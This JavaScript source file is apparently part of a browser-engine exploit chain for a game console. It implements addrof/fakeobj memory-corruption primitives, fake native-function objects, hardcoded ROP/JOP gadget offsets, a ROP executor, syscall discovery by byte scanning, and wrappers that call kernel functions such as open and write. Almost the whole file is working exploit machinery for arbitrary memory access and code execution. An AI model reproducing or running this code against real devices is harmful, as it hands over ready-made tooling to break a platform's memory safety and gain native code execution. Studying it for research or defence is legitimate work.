class BigInt {
  /**
   * @param  {[number, number]|number|string|BigInt|ArrayLike<number>}
   */
  constructor () {
    this.buf = new ArrayBuffer(8)
    this.i8 = new Int8Array(this.buf)
    this.u8 = new Uint8Array(this.buf)
    this.i16 = new Int16Array(this.buf)
    this.u16 = new Uint16Array(this.buf)
    this.i32 = new Int32Array(this.buf)
    this.u32 = new Uint32Array(this.buf)
    this.f32 = new Float32Array(this.buf)
    this.f64 = new Float64Array(this.buf)

    switch (arguments.length) {
      case 0:
        break
      case 1:
        var value = arguments[0]
        switch (typeof value) {
          case 'boolean':
            this.u8[0] = (value === true) | 0
            break
          case 'number':
            if (isNaN(value)) {
              throw new TypeError(`Number ${value} is NaN`)
            }

            if (Number.isInteger(value)) {
              if (!Number.isSafeInteger(value)) {
                throw new RangeError(`Integer ${value} outside safe 53-bit range`)
              }

              this.u32[0] = value
              this.u32[1] = value / 0x100000000
            } else {
              this.f64[0] = value
            }

            break
          case 'string':
            if (value.startsWith('0x')) {
              value = value.slice(2)
            }

            if (value.length > this.u8.length * 2) {
              throw new RangeError(`String ${value} is out of range !!`)
            }

            while (value.length < this.u8.length * 2) {
              value = '0' + value
            }

            for (var i = 0; i < this.u8.length; i++) {
              var start = value.length - 2 * (i + 1)
              var end = value.length - 2 * i
              var b = value.slice(start, end)
              this.u8[i] = parseInt(b, 16)
            }

            break
          case 'object':
            if (value instanceof BigInt) {
              this.u8.set(value.u8)
              break
            } else {
              var prop = BigInt.TYPE_MAP[value.constructor.name]
              if (prop in this) {
                var arr = this[prop]
                if (value.length !== arr.length) {
                  throw new Error(
                    `Array length mismatch, expected ${arr.length} got ${value.length}.`
                  )
                }

                arr.set(value)
                break
              }
            }
          default:
            throw new TypeError(`Unsupported value ${value} !!`)
        }
        break
      case 2:
        var hi = arguments[0]
        var lo = arguments[1]

        if (!Number.isInteger(hi)) {
          throw new RangeError(`hi value ${hi} is not an integer !!`)
        }

        if (!Number.isInteger(lo)) {
          throw new RangeError(`lo value ${lo} is not an integer !!`)
        }

        if (hi < 0 || hi > 0xFFFFFFFF) {
          throw new RangeError(`hi value ${hi} is out of 32-bit range !!`)
        }
        if (lo < 0 || lo > 0xFFFFFFFF) {
          throw new RangeError(`lo value ${lo} is out of 32-bit range !!`)
        }

        this.u32[0] = lo
        this.u32[1] = hi
        break
      default:
        throw new TypeError('Unsupported input !!')
    }
  }

  valueOf () {
    var hi = this.hi()
    var lo = this.lo()
    
    if (hi <= 0x1FFFFF) {
      return hi * 0x100000000 + lo
    }

    var f = this.f64[0]
    if (!isNaN(f)) {
      return f
    }

    throw new RangeError(`Unable to convert ${this} to primitive`)
  }

  toString () {
    var value = '0x'
    for (var i = this.u8.length - 1; i >= 0; i--) {
      var c = this.u8[i].toString(16).toUpperCase()
      value += c.length === 1 ? '0' + c : c
    }

    return value
  }

  endian () {
    for (var i = 0; i < this.u8.length / 2; i++) {
      var b = this.u8[i]
      this.u8[i] = this.u8[this.u8.length - 1 - i]
      this.u8[this.u8.length - 1 - i] = b
    }
  }

  lo () {
    return this.u32[0]
  }

  hi () {
    return this.u32[1]
  }

  d () {
    if (this.u8[7] === 0xFF && (this.u8[6] === 0xFF || this.u8[6] === 0xFE)) {
      throw new RangeError('Integer value cannot be represented by a double')
    }

    return this.f64[0]
  }

  jsv () {
    if ((this.u8[7] === 0 && this.u8[6] === 0) || (this.u8[7] === 0xFF && this.u8[6] === 0xFF)) {
      throw new RangeError('Integer value cannot be represented by a JSValue')
    }

    return this.sub(new BigInt(0x10000, 0)).d()
  }

  cmp (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    if (this.hi() > value.hi()) {
      return 1
    }

    if (this.hi() < value.hi()) {
      return -1
    }

    if (this.lo() > value.lo()) {
      return 1
    }

    if (this.lo() < value.lo()) {
      return -1
    }

    return 0
  }

  eq (value) {
    value = value instanceof BigInt ? value : new BigInt(value)
    
    return this.hi() === value.hi() && this.lo() === value.lo()
  }

  neq (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    return this.hi() !== value.hi() || this.lo() !== value.lo()
  }

  gt (value) {
    return this.cmp(value) > 0
  }

  gte (value) {
    return this.cmp(value) >= 0
  }

  lt (value) {
    return this.cmp(value) < 0
  }

  lte (value) {
    return this.cmp(value) <= 0
  }

  add (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var b = this.u8[i] + value.u8[i] + c
      c = (b > 0xFF) | 0
      ret.u8[i] = b
    }

    if (c !== 0) {
      throw new Error('add overflowed !!');
    }

    return ret
  }

  sub (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var b = this.u8[i] - value.u8[i] - c
      c = (b < 0) | 0
      ret.u8[i] = b
    }

    if (c !== 0) {
      throw new Error('sub underflowed !!')
    }

    return ret
  }

  mul (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var s = c
      for (var j = 0; j <= i; j++) {
        s += this.u8[j] * (value.u8[i - j] || 0)
      }

      ret.u8[i] = s & 0xFF
      c = s >>> 8
    }

    if (c !== 0) {
      throw new Error('mul overflowed !!')
    }

    return ret
  }

  divmod (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    if (!value.gte(BigInt.Zero)) {
      throw new Error('Division by zero')
    }

    var q = new BigInt()
    var r = new BigInt()

    for (var b = (this.buf.byteLength * 8) - 1; b >= 0; b--) {
      r = r.shl(1)

      var byte_idx = Math.floor(b / 8)
      var bit_idx = b % 8

      r.u8[0] |= (this.u8[byte_idx] >> bit_idx) & 1

      if (r.gte(value)) {
        r = r.sub(value)

        q.u8[byte_idx] |= 1 << bit_idx
      }
    }

    return { q, r }
  }

  div (value) {
    return this.divmod(value).q
  }

  mod (value) {
    return this.divmod(value).r
  }

  xor (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] ^ value.u8[i]
    }

    return ret
  }

  and (value) {
    value = value instanceof BigInt ? value : new BigInt(value)
    
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] & value.u8[i]
    }

    return ret
  }

  or (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] | value.u8[i]
    }

    return ret
  }

  neg () {
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = ~this.u8[i]
    }

    return ret.and(BigInt.One)
  }

  shl (count) {
    if (count < 0 || count > 64) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    var ret = new BigInt()

    var byte_count = Math.floor(count / 8)
    var bit_count = count % 8

    for (var i = this.buf.byteLength - 1; i >= 0; i--) {
      var t = i - byte_count
      var b = t >= 0 ? this.u8[t] : 0

      if (bit_count) {
        var p = t - 1 >= 0 ? this.u8[t - 1] : 0
        b = ((b << bit_count) | (p >> (8 - bit_count))) & 0xFF
      }

      ret.u8[i] = b
    }

    return ret
  }

  shr (count) {
    if (count < 0 || count > 64) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    var ret = new BigInt()

    var byte_count = Math.floor(count / 8)
    var bit_count = count % 8

    for (var i = 0; i < this.buf.byteLength; i++) {
      var t = i + byte_count
      var b = t >= 0 ? this.u8[t] : 0

      if (bit_count) {
        var n = t + 1 >= 0 ? this.u8[t + 1] : 0
        b = ((b >> bit_count) | (n << (8 - bit_count))) & 0xff
      }

      ret.u8[i] = b
    }

    return ret
  }
}

BigInt.Zero = new BigInt()
BigInt.One = new BigInt(1)
BigInt.TYPE_MAP = {
  Int8Array: 'i8',
  Uint8Array: 'u8',
  Int16Array: 'i16',
  Uint16Array: 'u16',
  Int32Array: 'i32',
  Uint32Array: 'u32',
  Float32Array: 'f32',
  Float64Array: 'f64',
}

DataView.prototype.getBigInt = function (byteOffset, littleEndian) {
  littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian

  var lo = this.getUint32(byteOffset, true)
  var hi = this.getUint32(byteOffset + 4, true)

  return new BigInt(hi, lo)
}

DataView.prototype.setBigInt = function (byteOffset, value, littleEndian) {
  value = (value instanceof BigInt) ? value : new BigInt(value)
  littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian

  this.setUint32(byteOffset, value.lo(), littleEndian)
  this.setUint32(byteOffset + 4, value.hi(), littleEndian)
}

var mem = {
  allocs: new Map(),
  view: function (addr) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    return slave
  },
  addrof: function (obj) {
    leak_obj.obj = obj
    return mem.view(leak_obj_addr).getBigInt(0x10, true)
  },
  fakeobj: function (addr) {
    mem.view(leak_obj_addr).setBigInt(0x10, addr, true)
    return leak_obj.obj
  },
  copy: function (dst, src, sz) {
    var src_buf = new Uint8Array(sz)
    var dst_buf = new Uint8Array(sz)

    utils.set_backing(src_buf, src)
    utils.set_backing(dst_buf, dst)

    dst_buf.set(src_buf)
  },
  malloc: function (count) {
    var buf = new Uint8Array(count)
    var backing = utils.get_backing(buf)
    mem.allocs.set(backing, buf)
    return backing
  },
  free: function (addr) {
    if (mem.allocs.has(addr)) {
      mem.allocs.delete(addr)
    }
  },
  free_all: function () {
    mem.allocs.clear()
  }
}

var utils = {
  base_addr: function (func_addr) {
    var module_info_addr = mem.malloc(struct.ModuleInfoForUnwind.sizeof)

    var module_info = new struct.ModuleInfoForUnwind(module_info_addr)

    module_info.st_size = 0x130

    if (!fn.sceKernelGetModuleInfoForUnwind(func_addr, 1, module_info.addr).eq(0)) {
      throw new Error(`Unable to get ${func_addr} base addr`)
    }

    var base_addr = module_info.seg0_addr

    mem.free(module_info_addr)

    return base_addr
  },
  notify: function (msg) {
    var notify_addr = mem.malloc(struct.NotificationRequest.sizeof)

    var notify = new struct.NotificationRequest(notify_addr)

    for (var i = 0; i < msg.length; i++) {
      notify.message[i] = msg.charCodeAt(i) & 0xFF
    }

    notify.message[msg.length] = 0

    var fd = fn.open('/dev/notification0', 1, 0)
    if (fd.lt(0)) {
      throw new Error('Unable to open /dev/notification0 !!')
    }

    fn.write(fd, notify.addr, struct.NotificationRequest.sizeof)
    fn.close(fd)

    mem.free(notify_addr)
  },
  str: function (addr) {
    var chars = []

    var view = mem.view(addr)
    var term = false
    var offset = 0
    while (!term) {
      var c = view.getUint8(offset)
      if (c === 0) {
        term = true
        break
      }

      chars.push(c)

      offset++
    }

    return String.fromCharCode(...chars)
  },
  cstr: function (str) {
    var bytes = new Uint8Array(str.length + 1)

    for (var i = 0; i < str.length; i++) {
      bytes[i] = str.charCodeAt(i) & 0xFF
    }

    bytes[str.length] = 0

    var backing = utils.get_backing(bytes)
    mem.allocs.set(backing, bytes)
    return backing
  },
  get_backing: function(view) {
    return mem.view(mem.addrof(view)).getBigInt(0x10, true)
  },
  set_backing: function(view, addr) {
    return mem.view(mem.addrof(view)).setBigInt(0x10, addr, true)
  }
}

var fn = {
  register: function (input, name, ret) {
    if (name in this) {
      throw new Error(`${name} already registered in fn !!`)
    }

    var id
    var addr
    var syscall = false
    if (input instanceof BigInt) {
      addr = input
    } else if (typeof input === 'number') {
      if (!syscalls.map.has(input)) {
        throw new Error(`Syscall id ${input} not found !!`)
      }

      id = new BigInt(input)
      addr = syscalls.map.get(input)
      syscall = true
    } 

    var f = function () {
      if (arguments.length > 6) {
        throw new Error('More than 6 arguments is not supported !!')
      }

      var ctx = []
      var insts = []

      var regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]

      insts.push(gadgets.POP_RAX_RET)
      insts.push(syscall ? id : BigInt.Zero)

      for (var i = 0; i < arguments.length; i++) {
        var reg = regs[i]
        var value = arguments[i]

        insts.push(reg)

        switch (typeof value) {
          case 'boolean':
          case 'number':
            value = new BigInt(value)
            break
          case 'string':
            value = utils.cstr(value)
            ctx.push(value)
            break
          default:
            if (!(value instanceof BigInt)) {
              throw new Error(`Invalid value at arg ${i}`)
            }
            break
        }

        insts.push(value)
      }

      insts.push(addr)

      var store_size = ret ? 0x10 : 8
      var store_addr = mem.malloc(store_size)

      if (ret) {
        rop.store(insts, store_addr, 1)
      }

      rop.execute(insts, store_addr, store_size)

      while (ctx.length > 0) {
        mem.free(ctx.pop())
      }

      var result
      if (ret) {
        result = mem.view(store_addr).getBigInt(8, true)

        if (syscall) {
          if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
            mem.free(store_addr)

            var errno_addr = fn._error()
            var errno = mem.view(errno_addr).getUint32(0, true)
            var str = fn.strerror(errno)

            throw new Error(`${name} returned errno ${errno}: ${str}`)
          }
        }

        switch(ret) {
            case 'bigint':
              break
            case 'boolean':
              result = result.eq(BigInt.One)
              break
            case 'string':
              result = utils.str(result)
              break
            default:
              throw new Error(`Unsupported return type ${ret}`)
          }
      }

      mem.free(store_addr)

      return result
    }

    Object.defineProperty(f, 'addr', { value: addr })

    fn[name] = f
  },
  unregister (name) {
    if (!(name in this)) {
      log(`${name} not registered in fn !!`)
      return false
    }

    delete fn[name]

    return true
  }
}

var gadgets = {
  init: function (base) {
    gadgets.RET = base.add(0x4C)
    gadgets.POP_R10_RET = base.add(0x19E297C)
    gadgets.POP_R12_RET = base.add(0x3F3231)
    gadgets.POP_R14_RET = base.add(0x15BE0A)
    gadgets.POP_R15_RET = base.add(0x93CD7)
    gadgets.POP_R8_RET = base.add(0x19BFF1)
    gadgets.POP_R9_JO_RET = base.add(0x72277C)
    gadgets.POP_RAX_RET = base.add(0x54094)
    gadgets.POP_RBP_RET = base.add(0xC7)
    gadgets.POP_RBX_RET = base.add(0x9D314)
    gadgets.POP_RCX_RET = base.add(0x2C3DF3)
    gadgets.POP_RDI_RET = base.add(0x93CD8)
    gadgets.POP_RDX_RET = base.add(0x3A3DA2)
    gadgets.POP_RSI_RET = base.add(0xCFEFE)
    gadgets.POP_RSP_RET = base.add(0xC89EE)
    gadgets.LEAVE_RET = base.add(0x50C33)
    gadgets.MOV_RAX_QWORD_PTR_RDI_RET = base.add(0x36073)
    gadgets.MOV_QWORD_PTR_RDI_RAX_RET = base.add(0x27FD0) 
    gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40 = base.add(0x46E8F0)
    gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18 = base.add(0x3F6F70)
    gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10 = base.add(0x18B3B5)
    gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22 = base.add(0x1E25AA1)
    gadgets.PUSH_RBP_POP_RCX_RET = base.add(0x1737EEE)
    gadgets.MOV_RAX_RCX_RET = base.add(0x41015)
    gadgets.PUSH_RAX_POP_RBP_RET = base.add(0x4E82B9)
  }
}

var rop = {
  idx: 0,
  base: 0x2500,
  jop_stack_store: undefined,
  jop_stack_addr: undefined,
  stack_addr: undefined,
  fake: undefined,
  init: function (addr) {
    log('Initiate ROP...')

    gadgets.init(addr)

    rop.jop_stack_store = mem.malloc(8)
    rop.jop_stack_addr = mem.malloc(0x6A)
    rop.stack_addr = mem.malloc(rop.base * 2)

    var jop_stack_base_addr = rop.jop_stack_addr.add(0x22)

    mem.view(rop.jop_stack_addr).setBigInt(0, gadgets.POP_RSP_RET, true)
    mem.view(jop_stack_base_addr).setBigInt(0, rop.stack_addr.add(rop.base), true)
    mem.view(jop_stack_base_addr).setBigInt(0x10, gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22, true)
    mem.view(jop_stack_base_addr).setBigInt(0x18, gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true)
    mem.view(jop_stack_base_addr).setBigInt(0x40, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18, true)

    mem.view(rop.jop_stack_store).setBigInt(0, jop_stack_base_addr, true)

    rop.fake = rop.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)
    rop.reset()

    log('Achieved ROP !!')
  },
  free: function () {
    mem.free(rop.fake.executable)
    mem.free(rop.jop_stack_store)
    mem.free(rop.jop_stack_addr)
  },
  reset: function () {
    rop.idx = rop.base
  },
  push: function (value) {
    if (rop.idx > rop.base * 2) {
      throw new Error('Stack full !!')
    }

    mem.view(rop.stack_addr).setBigInt(rop.idx, value, true)
    rop.idx += 8
  },
  execute: function (insts, store_addr, store_size) {
    if (store_size % 8 !== 0) {
      throw new Error('Invalid store, not aligned by 8 bytes')
    }

    if (store_size < 8) {
      throw new Error('Invalid store, minimal size is 8 to store RSP')
    }

    var header = []

    header.push(gadgets.PUSH_RBP_POP_RCX_RET)
    header.push(gadgets.MOV_RAX_RCX_RET)
    rop.store(header, store_addr, 0)

    var footer = []

    rop.load(footer, store_addr, 0)
    footer.push(gadgets.PUSH_RAX_POP_RBP_RET)
    footer.push(gadgets.POP_RAX_RET)
    footer.push(BigInt.Zero)
    footer.push(gadgets.LEAVE_RET)

    insts = header.concat(insts).concat(footer)

    for (var inst of insts) {
      rop.push(inst)
    }

    rop.fake(0, 0, 0, mem.fakeobj(rop.jop_stack_store))

    rop.reset()
  },
  fake_builtin: function (addr) {
    function fake () {}

    var fake_native_executable = mem.malloc(0x60)
    debug(`fake_native_executable: ${fake_native_executable}`)

    mem.copy(fake_native_executable, native_executable, 0x60)
    mem.view(fake_native_executable).setBigInt(0x40, addr, true)

    var fake_addr = mem.addrof(fake)
    debug(`addrof(fake): ${fake_addr}`)

    mem.view(fake_addr).setBigInt(0x10, scope, true)
    mem.view(fake_addr).setBigInt(0x18, fake_native_executable, true)

    fake.executable = fake_native_executable

    return fake
  },
  store (insts, addr, index) {
    insts.push(gadgets.POP_RDI_RET)
    insts.push(addr.add(index * 8))
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
  },
  load (insts, addr, index) {
    insts.push(gadgets.POP_RDI_RET)
    insts.push(addr.add(index * 8))
    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET)
  }
}

var struct = {
  register: function (name, fields) {
    if (name in this) {
      throw new Error(`${name} already registered in struct !!`)
    }

    var [sizeof, infos] = struct.parse(fields)

    var cls = class {                    
      constructor(addr) {
        this.addr = addr
      }
    }

    this[name] = cls

    cls.tname = name
    cls.sizeof = sizeof
    cls.fields = fields

    for (var info of infos) {
      struct.define_property(cls, info)
    }
  },
  unregister: function (name) {
    if (!(name in this)) {
        throw new Error(`${name} not registered in struct !!`)
    }

    delete this[name]

    return true
  },
  parse: function (fields) {
    var infos = []
    var offset = 0
    var struct_alignment = 1
    for (var field of fields) {
      var size = 0
      var alignment = 0
      var pointer = false
      var type = field.type

      var [, name, count] = field.name.match(/^(.+?)(?:\[(\d+)\])?$/)

      if (type.includes('*')) {
          size = 8
          alignment = 8
          pointer = true
      } else if (type in this) {
        size = this[type].sizeof   
      } else {
        var bits = type.replace(/\D/g, '')
        if (bits % 8 !== 0) {
          throw new Error(`Invalid primitive type ${type}`)
        }

        size = bits / 8
        alignment = size
      }

      if (size === 0) {
          throw new Error(`Invalid size for ${field_name} !!`)
      }

      count = count ? parseInt(count) : 1

      if (offset % alignment !== 0) {
          offset += alignment - (offset % alignment)
      }

      infos.push({type: type, name: name, offset: offset, size: size, count: count, pointer: pointer})

      offset += size * count

      if (alignment > struct_alignment) {
          struct_alignment = alignment
      }
    }

    if (offset % struct_alignment !== 0) {
      offset += struct_alignment - (offset % struct_alignment)
    }

    return [offset, infos]
  },
  define_property: function (cls, info) {
    Object.defineProperty(cls.prototype, info.name, {
      get: function () {
        if (info.count > 1) {
          var addr = this.addr.add(info.offset)
          if (info.pointer) {
            addr = mem.view(addr).getBigInt(0, true)
          }

          var arr
          switch(info.type) {
            case 'Int8': 
              arr = new Int8Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Uint8':
              arr = new Uint8Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Int16': 
              arr = new Int16Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Uint16':
              arr = new Uint16Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Int32':
              arr = new Int32Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Uint32':
              arr = new Uint32Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Int64':
              arr = new Uint32Array(info.count * 2)
              utils.set_backing(arr, addr)
            case 'Uint64':
              arr = new Uint32Array(info.count * 2)
              utils.set_backing(arr, addr)
            default:
              if (info.type in this) {
                for (var i = 0; i < info.count; i++) {
                  arr[i] = new this[info.name](addr.add(i * info.size))
                }
              }

              throw new Error(`Invalid type ${info.type}`)
          }

          return arr
        } else {
          var value = mem.view(this.addr).getBigInt(info.offset, true)
          switch(info.type) {
            case 'Int8': return value.i8[0]
            case 'Uint8': return value.u8[0]
            case 'Int16': return value.i16[0]
            case 'Uint16': return value.u16[0]
            case 'Int32': return value.i32[0]
            case 'Uint32': return value.u32[0]
            case 'Int64': return value
            case 'Uint64': return value
            default:
              if (info.pointer) {
                return value
              }
                
              throw new Error(`Invalid type ${info.type}`)
          }
        }
      },
      set: function (value) {
        if (info.count > 1) {
          if (!value.buffer) {
            throw new Error('value is not a typed array')
          }

          if (value.buffer.byteLength !== info.size * info.count) {
            throw new Error(`expected ${info.size * info.count} bytes got ${value.buffer.byteLength}`)
          }
              
          var addr = this.addr.add(info.offset)
          if (info.type.includes('*')) {
            addr = mem.view(addr).getBigInt(0, true)
          }

          var buf = new Uint8Array(info.size * info.count)
          utils.set_backing(buf, addr)

          buf.set(value)
        } else {
          var temp = mem.view(this.addr).getBigInt(info.offset, true)
          switch(info.type) {
            case 'Int8': 
              temp.i8[0] = value
              break
            case 'Uint8':
              temp.u8[0] = value
              break
            case 'Int16':
              temp.i16[0] = value
              break
            case 'Uint16':
              temp.u16[0] = value
              break
            case 'Int32':
              temp.i32[0] = value
              break
            case 'Uint32':
              temp.u32[0] = value
              break
            case 'Int64':
              temp = value
              break
            case 'Uint64':
              temp = value
              break
            default:
              if (info.type.includes('*')) {
                temp = value
                break
              }

              throw new Error(`Invalid type ${info.type}`)
          }

          mem.view(this.addr).setBigInt(info.offset, temp, true)
        }
      }
    })
  }
}

var syscalls = {
  pattern: [0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0x89, 0xCA, 0x0F, 0x05],
  map: new Map(),
  init: function (addr) {
    var offset = 0
    var count = 0x40000
    
    var view = mem.view(addr)
    
    var start_offset = 0
    var pattern_idx = 0
    while (offset < count) {
      var b = view.getUint8(offset)
      var c = syscalls.pattern[pattern_idx]
      if (b === c || (c === 0xFF && b < c)) {
        if (pattern_idx === 0) {
          start_offset = offset
        } else if (pattern_idx === syscalls.pattern.length - 1) {
          var match = view.getBigInt(start_offset, true)

          var id = match.shl(8).hi()

          syscalls.map.set(id, addr.add(start_offset))

          pattern_idx = 0
          continue
        }

        pattern_idx++
      } else {
        pattern_idx = 0
      }

      offset++
    }
  },
  clear: function () {
    syscalls.map.clear()
  }
}